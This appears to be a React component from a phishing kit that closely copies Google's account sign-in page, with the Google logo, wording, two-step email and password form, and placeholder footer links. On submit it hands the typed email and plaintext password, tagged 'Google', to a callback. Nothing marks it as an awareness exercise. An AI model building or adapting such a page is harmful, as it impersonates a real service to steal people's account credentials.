import React, { useState } from 'react';
import { ChevronDown, Pencil } from 'lucide-react';

interface GoogleLoginProps {
  onSuccess: (data: any) => void;
}

const GoogleLogin: React.FC<GoogleLoginProps> = ({ onSuccess }) => {
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isFocused, setIsFocused] = useState(false);

  const handleNext = () => {
    if (email) setStep('password');
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSuccess({ platform: 'Google', email, password });
  };

  return (
    <div className="min-h-full w-full bg-googleBg flex flex-col justify-between items-center py-12 px-6 font-roboto select-none animate-view">
      <div className="flex-1 flex items-center justify-center w-full">
        <div className="bg-googleDark border border-neutral-800 rounded-[28px] p-10 md:p-12 max-w-[1040px] w-full min-h-[480px] grid grid-cols-1 md:grid-cols-2 gap-12 items-start smooth-transition">
          
          <div className="flex flex-col space-y-4">
            <svg className="h-10 w-auto self-start" viewBox="0 0 24 24">
              <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v3.92h6.61c-.29 1.5-1.14 2.77-2.4 3.61v3h3.84c2.24-2.06 3.69-5.1 3.69-8.46z"/>
              <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.84-3c-1.08.72-2.45 1.16-4.09 1.16-3.15 0-5.81-2.13-6.76-5.01H1.31v3.1A12 12 0 0 0 12 24z"/>
              <path fill="#FBBC05" d="M5.24 14.24a7.15 7.15 0 0 1 0-4.48v-3.1H1.31a12 12 0 0 0 0 10.68l3.93-3.1z"/>
              <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.43-3.43A11.93 11.93 0 0 0 12 0 12 12 0 0 0 1.31 6.66l3.93 3.1c.95-2.88 3.61-5.01 6.76-5.01z"/>
            </svg>
            
            <h1 className="text-4xl text-[#e3e3e3] font-normal leading-tight font-sans pt-3">Sign in</h1>
            <p className="text-[16px] text-[#c4c7c5]">Use your Google Account</p>
          </div>

          <form onSubmit={step === 'email' ? (e) => { e.preventDefault(); handleNext(); } : handleSubmit} className="flex flex-col space-y-6 pt-4 md:pt-0">
            {step === 'email' ? (
              <>
                <div className="relative w-full">
                  <div className={`border rounded-lg p-4 flex items-center smooth-transition ${isFocused || email ? 'border-blue-400 ring-1 ring-blue-400' : 'border-neutral-700'}`}>
                    <input 
                      type="text" 
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      onFocus={() => setIsFocused(true)}
                      onBlur={() => setIsFocused(false)}
                      className="w-full bg-transparent outline-none border-none text-[16px] text-white pt-1 pb-1"
                    />
                    <label className={`absolute left-4 pointer-events-none transition-all duration-200 origin-left ${isFocused || email ? 'top-1 -translate-y-0 text-xs text-blue-400 bg-googleDark px-1' : 'top-1/2 -translate-y-1/2 text-gray-400 text-[16px]'}`}>
                      Email or phone
                    </label>
                  </div>
                </div>

                <div className="flex flex-col space-y-1">
                  <a href="#" className="text-blue-400 font-semibold text-sm hover:text-blue-300 transition duration-150 self-start">Forgot email?</a>
                </div>

                <div className="text-[#c4c7c5] text-xs leading-relaxed pt-2">
                  Not your computer? Use Guest mode to sign in privately. <br />
                  <a href="#" className="text-blue-400 font-semibold hover:text-blue-300 transition">Learn more about using Guest mode</a>
                </div>

                <div className="flex items-center justify-between pt-8">
                  <button type="button" className="text-blue-400 font-semibold hover:bg-blue-500/10 rounded-full px-4 py-2 transition scale-on-click text-sm">
                    Create account
                  </button>
                  <button type="button" onClick={handleNext} className="bg-blue-400 hover:bg-blue-300 text-neutral-900 font-semibold rounded-full px-7 py-2.5 transition duration-200 scale-on-click text-sm flex items-center space-x-2 shadow-lg shadow-blue-500/5">
                    <span>Next</span>
                  </button>
                </div>
              </>
            ) : (
              <>
                <div className="flex items-center space-x-3 bg-white/5 border border-white/10 rounded-full p-2 pr-4 self-start">
                  <div className="w-6 h-6 rounded-full bg-blue-500 flex items-center justify-center text-xs font-bold text-white">
                    {email.charAt(0).toUpperCase()}
                  </div>
                  <span className="text-sm text-gray-300">{email}</span>
                  <button type="button" onClick={() => setStep('email')} className="text-blue-400 text-xs hover:underline"><Pencil size={12} /></button>
                </div>

                <div className="relative w-full">
                  <div className={`border rounded-lg p-4 flex items-center smooth-transition ${isFocused || password ? 'border-blue-400' : 'border-neutral-700'}`}>
                    <input 
                      type="password" 
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      onFocus={() => setIsFocused(true)}
                      onBlur={() => setIsFocused(false)}
                      className="w-full bg-transparent outline-none border-none text-[16px] text-white pt-1 pb-1"
                      autoFocus
                    />
                    <label className={`absolute left-4 pointer-events-none transition-all duration-200 origin-left ${isFocused || password ? 'top-1 -translate-y-0 text-xs text-blue-400 bg-googleDark px-1' : 'top-1/2 -translate-y-1/2 text-gray-400 text-[16px]'}`}>
                      Enter your password
                    </label>
                  </div>
                </div>

                <div className="flex items-center space-x-2">
                  <input type="checkbox" id="show-pass" className="rounded border-neutral-700 bg-neutral-800 text-blue-500 focus:ring-0 w-4 h-4 cursor-pointer" />
                  <label htmlFor="show-pass" className="text-sm text-gray-300 cursor-pointer">Show password</label>
                </div>

                <div className="flex items-center justify-between pt-8">
                  <button type="button" onClick={() => setStep('email')} className="text-blue-400 font-semibold hover:bg-blue-500/10 rounded-full px-4 py-2 transition scale-on-click text-sm">
                    Back
                  </button>
                  <button type="submit" className="bg-blue-400 hover:bg-blue-300 text-neutral-900 font-semibold rounded-full px-7 py-2.5 transition duration-200 scale-on-click text-sm">
                    Sign in
                  </button>
                </div>
              </>
            )}
          </form>

        </div>
      </div>

      <div className="max-w-[1040px] w-full flex flex-col sm:flex-row justify-between items-center text-xs text-[#a8aaaa] pt-6 gap-4 border-t border-transparent">
        <div className="relative group cursor-pointer flex items-center space-x-1.5 hover:text-white transition duration-200">
          <span>English (United States)</span>
          <ChevronDown size={12} />
        </div>
        <div className="flex items-center space-x-6">
          <a href="#" className="hover:text-white transition duration-200">Help</a>
          <a href="#" className="hover:text-white transition duration-200">Privacy</a>
          <a href="#" className="hover:text-white transition duration-200">Terms</a>
        </div>
      </div>
    </div>
  );
};

export default GoogleLogin;
